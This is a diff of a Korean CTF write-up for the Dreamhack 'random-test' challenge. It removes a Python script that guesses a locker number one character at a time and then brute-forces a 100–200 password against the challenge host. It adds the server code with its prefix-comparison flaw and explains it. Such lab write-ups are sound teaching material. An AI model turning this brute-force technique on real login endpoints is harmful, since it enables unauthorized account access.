@@ -6,39 +6,28 @@
 
 ### 2. 코드 분석
 
-풀이 스크립트에서는 `string.ascii_lowercase + string.digits`로 **영문 소문자 a~z와 숫자 0~9를 순서대로 시도**한다. `for _ in range(4)`는 4자리 번호를 찾기 위해 같은 과정을 네 번 반복하는 부분이다.
+문제에서 제공한 `random-test`의 `app.py`에서는 랜덤한 사물함 번호와 비밀번호를 생성한다.
 
 ```python
-import string
-import requests
+rand_str = ""
+alphanumeric = string.ascii_lowercase + string.digits
+for i in range(4):
+    rand_str += str(random.choice(alphanumeric))
 
-URL = "http://host3.dreamhack.games:12112/"
-locker = ""
-
-for _ in range(4):
-    for c in string.ascii_lowercase + string.digits:
-        candidate = locker + c
-        r = requests.post(URL, data={"locker_num": candidate, "password": ""})
-        if "Good" in r.text:
-            locker = candidate
-            break
-    else:
-        raise RuntimeError("번호를 찾지 못함")
-
-print("사물함 번호:", locker)
-
-# (생략)
-
-for password in range(100, 201):
-    r = requests.post(URL, data={"locker_num": locker, "password": str(password)})
-    if "FLAG:" in r.text:
-        print(r.text)
-        break
+rand_num = random.randint(100, 200)
 ```
 
-`candidate = locker + c`는 현재까지 찾은 번호에 문자를 하나 붙여 요청한다. 응답에 `Good`이 있으면 해당 문자를 `locker`에 저장하고 다음 자리로 넘어간다.
+`random.choice(alphanumeric)`로 영어 소문자와 숫자 중 한 글자를 무작위로 선택해 4번 이어 붙인다. 따라서 `rand_str`은 랜덤한 4자리 문자열이고, `rand_num`은 100부터 200 사이의 랜덤 정수다.
 
-**문자를 무작위로 생성하거나 매번 출력하는 코드는 아니다.** `print("사물함 번호:", locker)`는 네 자리를 찾은 후 최종 번호를 출력한다.
+```python
+if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
+    if locker_num == rand_str and password == str(rand_num):
+        return render_template("index.html", result = "FLAG:" + FLAG)
+```
+
+`rand_str[0:len(locker_num)]`는 입력한 길이만큼만 정답의 앞부분을 비교한다. 따라서 처음 한 글자만 일치해도 서버가 `Good`을 반환하며, 번호 네 자리와 비밀번호가 모두 일치할 때 `FLAG`가 출력된다.
+
+**이 조건을 이용하면 `Good` 응답으로 사물함 번호를 한 글자씩 찾을 수 있다.**
 
 ### 3. 사물함 번호를 찾는다
 
